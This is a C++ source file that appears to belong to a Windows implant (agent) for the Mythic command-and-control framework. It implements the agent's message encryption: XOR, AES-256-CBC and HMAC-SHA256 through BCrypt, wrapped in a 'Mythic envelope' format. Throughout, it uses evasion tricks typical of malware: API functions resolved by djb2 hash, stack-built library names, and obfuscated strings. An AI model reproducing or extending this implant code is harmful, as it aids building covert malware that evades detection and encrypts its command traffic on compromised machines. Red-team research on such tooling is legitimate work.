#include "crypto.h"
#include "common.h"

VOID xor_bytes(BYTE* data, DWORD data_len, const BYTE* key, DWORD key_len) {
    for (DWORD i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Minimal AES-256-CBC - uses bcrypt at runtime
#ifndef STATUS_SUCCESS
typedef LONG NTSTATUS;
#define STATUS_SUCCESS 0
#endif

#ifndef BCRYPT_ALG_HANDLE
typedef PVOID BCRYPT_ALG_HANDLE;
#endif
#ifndef BCRYPT_KEY_HANDLE
typedef PVOID BCRYPT_KEY_HANDLE;
#endif

typedef NTSTATUS (WINAPI *fnBCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, DWORD);
typedef NTSTATUS (WINAPI *fnBCryptSetProperty)(BCRYPT_ALG_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptEncrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, PULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS (WINAPI *fnBCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, DWORD);

BOOL aes256_encrypt(PINSTANCE inst, const BYTE* key, const BYTE* iv,
                    const BYTE* plain, DWORD plain_len,
                    BYTE** cipher, DWORD* cipher_len) {
    STK_BCRYPT(_bcrypt);
    PVOID bcrypt = inst->Win32.LoadLibraryA(_bcrypt);
    if (!bcrypt) return FALSE;

    fnBCryptOpenAlgorithmProvider pOpen = (fnBCryptOpenAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptOpenAlgorithmProvider")));
    fnBCryptSetProperty pSetProp = (fnBCryptSetProperty)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptSetProperty")));
    fnBCryptGenerateSymmetricKey pGenKey = (fnBCryptGenerateSymmetricKey)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptGenerateSymmetricKey")));
    fnBCryptEncrypt pEncrypt = (fnBCryptEncrypt)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptEncrypt")));
    fnBCryptDestroyKey pDestroy = (fnBCryptDestroyKey)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptDestroyKey")));
    fnBCryptCloseAlgorithmProvider pClose = (fnBCryptCloseAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptCloseAlgorithmProvider")));

    if (!pOpen || !pSetProp || !pGenKey || !pEncrypt || !pDestroy || !pClose)
        return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = pOpen(&hAlg, XWSTR(L"AES"), NULL, 0);
    if (status != STATUS_SUCCESS) return FALSE;

    status = pSetProp(hAlg, XWSTR(L"ChainingMode"), (PUCHAR)XWSTR(L"ChainingModeCBC"), 32, 0);
    if (status != STATUS_SUCCESS) { pClose(hAlg, 0); return FALSE; }

    status = pGenKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, AES_KEY_SIZE, 0);
    if (status != STATUS_SUCCESS) { pClose(hAlg, 0); return FALSE; }

    BYTE iv_copy[AES_BLOCK_SIZE];
    es_memcpy(iv_copy, (PVOID)iv, AES_BLOCK_SIZE);

    ULONG out_len = 0;
    status = pEncrypt(hKey, (PUCHAR)plain, plain_len, NULL, iv_copy, AES_BLOCK_SIZE, NULL, 0, &out_len, 0x01);
    if (status != STATUS_SUCCESS) { pDestroy(hKey); pClose(hAlg, 0); return FALSE; }

    *cipher = (BYTE*)es_malloc(inst, out_len);
    es_memcpy(iv_copy, (PVOID)iv, AES_BLOCK_SIZE);
    status = pEncrypt(hKey, (PUCHAR)plain, plain_len, NULL, iv_copy, AES_BLOCK_SIZE, *cipher, out_len, &out_len, 0x01);
    *cipher_len = out_len;

    pDestroy(hKey);
    pClose(hAlg, 0);
    return status == STATUS_SUCCESS;
}

BOOL aes256_decrypt(PINSTANCE inst, const BYTE* key, const BYTE* iv,
                    const BYTE* cipher, DWORD cipher_len,
                    BYTE** plain, DWORD* plain_len) {
    STK_BCRYPT(_bcrypt2);
    PVOID bcrypt = inst->Win32.LoadLibraryA(_bcrypt2);
    if (!bcrypt) return FALSE;

    fnBCryptOpenAlgorithmProvider pOpen = (fnBCryptOpenAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptOpenAlgorithmProvider")));
    fnBCryptSetProperty pSetProp = (fnBCryptSetProperty)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptSetProperty")));
    fnBCryptGenerateSymmetricKey pGenKey = (fnBCryptGenerateSymmetricKey)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptGenerateSymmetricKey")));
    fnBCryptDecrypt pDecrypt = (fnBCryptDecrypt)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptDecrypt")));
    fnBCryptDestroyKey pDestroy = (fnBCryptDestroyKey)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptDestroyKey")));
    fnBCryptCloseAlgorithmProvider pClose = (fnBCryptCloseAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptCloseAlgorithmProvider")));

    if (!pOpen || !pSetProp || !pGenKey || !pDecrypt || !pDestroy || !pClose)
        return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = pOpen(&hAlg, XWSTR(L"AES"), NULL, 0);
    if (status != STATUS_SUCCESS) return FALSE;

    status = pSetProp(hAlg, XWSTR(L"ChainingMode"), (PUCHAR)XWSTR(L"ChainingModeCBC"), 32, 0);
    if (status != STATUS_SUCCESS) { pClose(hAlg, 0); return FALSE; }

    status = pGenKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, AES_KEY_SIZE, 0);
    if (status != STATUS_SUCCESS) { pClose(hAlg, 0); return FALSE; }

    BYTE iv_copy[AES_BLOCK_SIZE];
    es_memcpy(iv_copy, (PVOID)iv, AES_BLOCK_SIZE);

    ULONG out_len = 0;
    status = pDecrypt(hKey, (PUCHAR)cipher, cipher_len, NULL, iv_copy, AES_BLOCK_SIZE, NULL, 0, &out_len, 0x01);
    if (status != STATUS_SUCCESS) { pDestroy(hKey); pClose(hAlg, 0); return FALSE; }

    *plain = (BYTE*)es_malloc(inst, out_len);
    es_memcpy(iv_copy, (PVOID)iv, AES_BLOCK_SIZE);
    status = pDecrypt(hKey, (PUCHAR)cipher, cipher_len, NULL, iv_copy, AES_BLOCK_SIZE, *plain, out_len, &out_len, 0x01);
    *plain_len = out_len;

    pDestroy(hKey);
    pClose(hAlg, 0);
    return status == STATUS_SUCCESS;
}

// HMAC-SHA256 via BCrypt
typedef PVOID BCRYPT_HASH_HANDLE;
typedef NTSTATUS (WINAPI *fnBCryptCreateHash)(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptHashData)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptFinishHash)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fnBCryptDestroyHash)(BCRYPT_HASH_HANDLE);
typedef NTSTATUS (WINAPI *fnBCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);

BOOL hmac_sha256(PINSTANCE inst, const BYTE* key, DWORD key_len,
                 const BYTE* data, DWORD data_len, BYTE* output) {
    STK_BCRYPT(_bc);
    PVOID bcrypt = inst->Win32.LoadLibraryA(_bc);
    if (!bcrypt) return FALSE;

    auto pOpen = (fnBCryptOpenAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptOpenAlgorithmProvider")));
    auto pCreateHash = (fnBCryptCreateHash)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptCreateHash")));
    auto pHashData = (fnBCryptHashData)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptHashData")));
    auto pFinishHash = (fnBCryptFinishHash)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptFinishHash")));
    auto pDestroyHash = (fnBCryptDestroyHash)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptDestroyHash")));
    auto pClose = (fnBCryptCloseAlgorithmProvider)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptCloseAlgorithmProvider")));

    if (!pOpen || !pCreateHash || !pHashData || !pFinishHash || !pDestroyHash || !pClose)
        return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;

    // BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x00000008
    NTSTATUS s = pOpen(&hAlg, XWSTR(L"SHA256"), NULL, 0x00000008);
    if (s != 0) return FALSE;

    s = pCreateHash(hAlg, &hHash, NULL, 0, (PUCHAR)key, key_len, 0);
    if (s != 0) { pClose(hAlg, 0); return FALSE; }

    s = pHashData(hHash, (PUCHAR)data, data_len, 0);
    if (s != 0) { pDestroyHash(hHash); pClose(hAlg, 0); return FALSE; }

    s = pFinishHash(hHash, output, HMAC_SHA256_SIZE, 0);
    pDestroyHash(hHash);
    pClose(hAlg, 0);
    return s == 0;
}

BOOL has_encryption_key(PINSTANCE inst) {
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        if (inst->Config.aes_key[i] != 0) return TRUE;
    }
    return FALSE;
}

// Mythic envelope: IV(16) + AES-CBC(plaintext) + HMAC-SHA256(IV + ciphertext)
BOOL mythic_encrypt(PINSTANCE inst, const BYTE* plain, DWORD plain_len,
                    BYTE** out, DWORD* out_len) {
    STK_BCRYPT(_bc2);
    PVOID bcrypt = inst->Win32.LoadLibraryA(_bc2);
    if (!bcrypt) return FALSE;

    auto pGenRandom = (fnBCryptGenRandom)resolve_function(bcrypt, hash_string_djb2(XSTR("BCryptGenRandom")));
    if (!pGenRandom) return FALSE;

    BYTE iv[AES_BLOCK_SIZE];
    // BCRYPT_USE_SYSTEM_PREFERRED_RNG = 0x00000002
    if (pGenRandom(NULL, iv, AES_BLOCK_SIZE, 0x00000002) != 0) return FALSE;

    BYTE* ct = NULL;
    DWORD ct_len = 0;
    if (!aes256_encrypt(inst, inst->Config.aes_key, iv, plain, plain_len, &ct, &ct_len))
        return FALSE;

    // HMAC-SHA256 over IV + ciphertext
    DWORD iv_ct_len = AES_BLOCK_SIZE + ct_len;
    BYTE* iv_ct = (BYTE*)es_malloc(inst, iv_ct_len);
    if (!iv_ct) { es_free(inst, ct); return FALSE; }
    es_memcpy(iv_ct, iv, AES_BLOCK_SIZE);
    es_memcpy(iv_ct + AES_BLOCK_SIZE, ct, ct_len);

    BYTE hmac[HMAC_SHA256_SIZE];
    BOOL hmac_ok = hmac_sha256(inst, inst->Config.aes_key, AES_KEY_SIZE,
                               iv_ct, iv_ct_len, hmac);
    es_free(inst, iv_ct);
    if (!hmac_ok) { es_free(inst, ct); return FALSE; }

    // Build output: IV + ciphertext + HMAC
    *out_len = AES_BLOCK_SIZE + ct_len + HMAC_SHA256_SIZE;
    *out = (BYTE*)es_malloc(inst, *out_len);
    if (!*out) { es_free(inst, ct); return FALSE; }

    es_memcpy(*out, iv, AES_BLOCK_SIZE);
    es_memcpy(*out + AES_BLOCK_SIZE, ct, ct_len);
    es_memcpy(*out + AES_BLOCK_SIZE + ct_len, hmac, HMAC_SHA256_SIZE);
    es_free(inst, ct);
    return TRUE;
}

BOOL mythic_decrypt(PINSTANCE inst, const BYTE* blob, DWORD blob_len,
                    BYTE** out, DWORD* out_len) {
    // Minimum: IV(16) + one AES block(16) + HMAC(32) = 64
    if (blob_len < AES_BLOCK_SIZE + AES_BLOCK_SIZE + HMAC_SHA256_SIZE)
        return FALSE;

    const BYTE* iv = blob;
    DWORD ct_len = blob_len - AES_BLOCK_SIZE - HMAC_SHA256_SIZE;
    const BYTE* ct = blob + AES_BLOCK_SIZE;
    const BYTE* msg_hmac = blob + AES_BLOCK_SIZE + ct_len;

    // Verify HMAC over IV + ciphertext
    BYTE computed_hmac[HMAC_SHA256_SIZE];
    DWORD iv_ct_len = AES_BLOCK_SIZE + ct_len;
    if (!hmac_sha256(inst, inst->Config.aes_key, AES_KEY_SIZE,
                     blob, iv_ct_len, computed_hmac))
        return FALSE;

    // Constant-time compare
    BYTE diff = 0;
    for (int i = 0; i < HMAC_SHA256_SIZE; i++)
        diff |= computed_hmac[i] ^ msg_hmac[i];
    if (diff != 0) return FALSE;

    return aes256_decrypt(inst, inst->Config.aes_key, iv, ct, ct_len, out, out_len);
}
